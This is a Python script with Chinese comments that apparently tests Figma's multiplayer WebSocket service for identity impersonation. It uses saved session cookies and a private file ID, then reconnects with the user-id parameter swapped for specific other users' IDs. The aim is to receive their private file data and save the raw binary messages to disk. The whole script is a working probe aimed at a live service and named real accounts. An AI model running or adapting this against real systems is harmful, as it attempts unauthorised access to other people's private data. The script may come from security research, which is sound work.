"""multiplayer WS 身份叠加 + 二进制协议分析

创造目标：登录态连接下，URL 的 user-id 参数换成目标用户 ID。
如果 multiplayer 服务信任 URL user-id 做身份（而不像 livegraph 只认 cookie）→
服务端把目标用户视角的私有文件数据推给我 → 身份冒充（高危）。

同时抓取二进制消息原始字节落盘，供协议分析（判断 protobuf/msgpack/json）。

对照组：
  1. 私有文件登录态 user-id=自己（基准，应保持连接）
  2. 私有文件登录态 user-id=目标用户 1484993095538571712（冒充）
  3. 私有文件登录态 user-id=不存在用户 9999999999999999999（对照：声明无效身份）
  4. 私有文件登录态 user-id=目标团队用户 1488654565930531375（第二目标）
"""
import json, sys, time, os
import websocket

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

SESS = json.load(open(r"D:\scan\_figma_hunt\figma_session.json"))
COOKIE_STR = "; ".join(f"{c['name']}={c['value']}" for c in SESS if c.get("name") and c.get("value"))

PRIVATE = "qzDqStIDJyGbthpKiuvfwg"
SELF = "1666382703778278399"
TARGET_A = "1484993095538571712"      # 公开文件 FileRole 用户
TARGET_B = "1488654565930531375"      # 目标团队用户
GHOST = "9999999999999999999"
COMMIT = "5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"


def build_url(user_id):
    return (f"wss://www.figma.com/api/multiplayer/{PRIVATE}"
            f"?role=editor"
            f"&tracking_session_id=bbenpPqP1cBhDyOD"
            f"&version=201&recentReload=0"
            f"&file-load-streaming-compression"
            f"&scenegraph-queries-initial-nodes=0:1"
            f"&user-id={user_id}"
            f"&client_release={COMMIT}")


def test(name, user_id, save=False, wait=10):
    print(f"\n===== {name} (user-id={user_id}) =====")
    headers = ["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
               f"Cookie: {COOKIE_STR}"]
    try:
        ws = websocket.create_connection(build_url(user_id), timeout=15,
                                         origin="https://www.figma.com", header=headers)
        print("  握手成功 (101)")
    except Exception as e:
        print(f"  握手失败: {type(e).__name__} {e}")
        return None
    blobs = []
    end = time.time() + wait
    while time.time() < end:
        try:
            ws.settimeout(min(3, end - time.time()))
            opcode, data = ws.recv_data()
            if opcode == 0x8:
                print(f"  >>> 服务端 CLOSE: {data!r}")
                break
            if opcode == 0x2:
                blobs.append(data)
                print(f"  [二进制 {len(data)}B] hex前32={data[:32].hex()}  utf8前64={data[:64]!r}")
        except websocket.WebSocketTimeoutException:
            continue
        except Exception as e:
            print(f"  连接中断: {type(e).__name__} {e}")
            break
    else:
        print("  连接保持（无关闭）")
    ws.close()
    total = sum(len(b) for b in blobs)
    print(f"  共 {len(blobs)} 条消息, {total} 字节")
    if save and blobs:
        fn = f"mp_{user_id}_dump.bin"
        with open(fn, "wb") as f:
            for b in blobs:
                f.write(len(b).to_bytes(4, "big") + b)
        print(f"  已保存 {fn}")
    return blobs


if __name__ == "__main__":
    test("1.基准: user-id=自己", SELF, save=True)
    test("2.冒充A: user-id=目标用户", TARGET_A, save=True)
    test("3.对照: user-id=不存在用户", GHOST)
    test("4.冒充B: user-id=目标团队用户", TARGET_B)
